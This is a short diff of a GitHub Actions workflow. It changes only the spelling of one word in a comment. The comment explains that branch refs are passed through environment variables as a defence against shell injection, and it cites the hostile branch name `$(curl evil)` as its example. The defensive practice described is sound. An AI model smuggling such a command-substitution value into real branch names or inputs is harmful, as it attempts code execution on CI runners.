@@ -149,7 +149,7 @@ jobs:
         if: steps.verify.outputs.skip != 'true' && steps.resolve.outputs.found == 'true'
         # Refs are passed via env vars so they are never expanded as GHA
         # expressions inside `run:` (defence against shell-injection via a
-        # branch name like `$(curl evil)`). The diff script also sanitises
+        # branch name like `$(curl evil)`). The diff script also sanitizes
         # them before embedding in the markdown body.
         env:
           BASE_REF: ${{ steps.resolve.outputs.base_ref }}
